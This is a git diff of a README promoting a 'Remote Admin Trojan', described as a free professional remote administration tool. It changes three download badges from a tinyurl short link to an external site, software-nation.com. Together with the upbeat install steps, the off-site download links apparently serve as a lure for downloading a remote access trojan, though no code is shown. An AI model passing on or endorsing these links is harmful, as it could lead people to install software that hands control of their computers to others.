@@ -9,7 +9,7 @@ The **🖥️ Remote Admin Trojan** is a professional remote administration tool
 
 <div align="center">
 
-[![Download Remote Admin Trojan](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/remote-admin-trojan)
+[![Download Remote Admin Trojan](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/remote-admin-trojan)
 
 </div>
 
@@ -102,7 +102,7 @@ You need a remote admin tool. Secure. Powerful. Free.
 5. **🚀 Launch Remote Admin Server** from desktop shortcut
 6. **🔑 Set admin password** — secure your server
 
-[![Download Remote Admin Trojan](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/remote-admin-trojan)
+[![Download Remote Admin Trojan](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/remote-admin-trojan)
 
 ### Client Installation (Remote PC)
 
@@ -415,7 +415,7 @@ Professional remote administration made simple. **Remote Admin Trojan** gives yo
 
 <div align="center">
 
-[![Download Remote Admin Trojan](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/remote-admin-trojan)
+[![Download Remote Admin Trojan](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/remote-admin-trojan)
 
 **Version 3.1.0** — Professional remote administration. Free forever.
 
